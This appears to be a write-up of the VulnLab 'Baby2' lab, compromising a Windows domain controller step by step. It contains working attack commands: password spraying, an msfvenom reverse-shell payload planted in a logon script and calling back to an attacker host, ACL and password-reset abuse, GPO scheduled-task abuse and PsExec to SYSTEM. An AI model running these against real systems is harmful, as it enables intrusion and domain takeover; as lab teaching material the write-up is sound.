---
title: "Baby2"
---

# VulnLab - Baby2 Writeup

![Baby2 screenshot](babytwo.png)

Welcome reader, today we’ll hack **Baby2** from VulnLab. It’s a medium Windows machine with a nice chain through SMB share abuse, GPO manipulation, and scheduled task execution.

## Enumeration

I started by checking what ports were open on the target.

```text
Discovered open port 445/tcp on 10.10.66.25
Discovered open port 53/tcp on 10.10.66.25
Discovered open port 3389/tcp on 10.10.66.25
Discovered open port 139/tcp on 10.10.66.25
Discovered open port 135/tcp on 10.10.66.25
Discovered open port 464/tcp on 10.10.66.25
Discovered open port 3269/tcp on 10.10.66.25
Discovered open port 49680/tcp on 10.10.66.25
```

The target looked like a Windows domain controller, so I moved to SMB enumeration.

## SMB Shares

Anonymous share enumeration showed several interesting shares.

```bash
smbclient -L //10.10.66.25
```

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
apps            Disk
C$              Disk      Default share
docs            Disk
homes           Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

The `homes` share contained several user directories, so I extracted the usernames and tried them as both username and password.

```bash
nxc smb 10.10.66.25 -u user.txt -p user.txt --shares
```

That gave me valid access as `Carl.Moore`.

```text
[+] baby2.vl\Carl.Moore:Carl.Moore
```

I also checked the user list again with the valid account and noticed a user I had missed earlier: `gpoadm`.

```text
SMB         10.10.66.25     445    DC               gpoadm
```

Later I found another valid account: `library:library`.

## NETLOGON

Using `Carl.Moore`, I accessed `NETLOGON` and found a VBS script.

```bash
smbclient.py "baby2.vl"/"Carl.Moore":"Carl.Moore"@"10.10.66.25"
```

```text
smb: \> ls
login.vbs
```

The script mapped network drives:

```vbscript
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

At first this looked harmless, but it gave me a path to attack the domain through shared scripts.

## Initial Foothold

I authenticated as `library` and confirmed I had write access to the shares.

```bash
nxc smb 10.10.66.25 -u library -p library --shares
```

```text
apps            READ,WRITE
docs            READ,WRITE
homes           READ,WRITE
```

I then crafted a malicious `login.vbs` payload with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.1.242 LPORT=1234 -f vbs -o login.vbs
```

I started a listener:

```bash
rlwrap nc -nlvp 1234
```

Then I replaced the existing `login.vbs` in SYSVOL with my payload.

```bash
put login.vbs
```

That gave me a shell immediately.

```text
C:\Windows\system32>whoami
baby2\amelia.griffiths
```

That was the user shell.

## BloodHound

After getting the shell, I used BloodHound to understand the privilege structure.

It showed a path to the Default Domain Controllers Policy and indicated that `Amelia.Griffiths` could abuse permissions over `GPOADM`.

The attack path relied on `WriteDacl`, so I gave Amelia full rights over the group:

```powershell
Add-DomainObjectAcl -Rights "All" -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths"
```

Then I changed the password of `GPOADM`:

```powershell
$Password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $Password
```

## GPO Abuse

From BloodHound I also pulled the GPO ID and used `pyGPOAbuse` to create an immediate scheduled task.

The first attempt failed because the GPO already had a `ScheduledTasks.xml`.

```text
ERROR:root:The GPO already includes a ScheduledTasks.xml.
Use -f to append to ScheduledTasks.xml
```

So I reran it with `-f`:

```bash
python3 pygpoabuse.py "baby2.vl"/'gpoadm':'Password123!' -f -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 10.10.79.101 -command 'net localgroup administrator GPOADM /add'
```

That created the scheduled task successfully.

```text
SUCCESS:root:ScheduledTask TASK_a89fa407 created!
```

## SYSTEM Shell

With `GPOADM` in the local Administrators group, I used PsExec to get SYSTEM.

```bash
psexec.py GPOADM:'Password123!'@10.10.79.101
```

That popped a SYSTEM shell.

```text
C:\Windows\system32> whoami
nt authority\system
```

## Attack Path

- **Enumerate the host** — identify SMB, DNS, RDP, and LDAP services.
- **Pull usernames from shares** — enumerate `homes` and build a user list.
- **Find a valid account** — discover `Carl.Moore` and later `library`.
- **Inspect NETLOGON** — locate the `login.vbs` script.
- **Abuse file replacement** — upload a malicious `login.vbs` to get code execution.
- **Gain a user shell** — land as `baby2\amelia.griffiths`.
- **Map permissions** — use BloodHound to find the GPO path.
- **Abuse ACLs** — grant `Amelia.Griffiths` full control over `GPOADM`.
- **Reset the password** — set `GPOADM` to a known password.
- **Abuse GPO scheduled tasks** — use `pyGPOAbuse` to add an admin action.
- **Get SYSTEM** — authenticate with PsExec and finish the box.
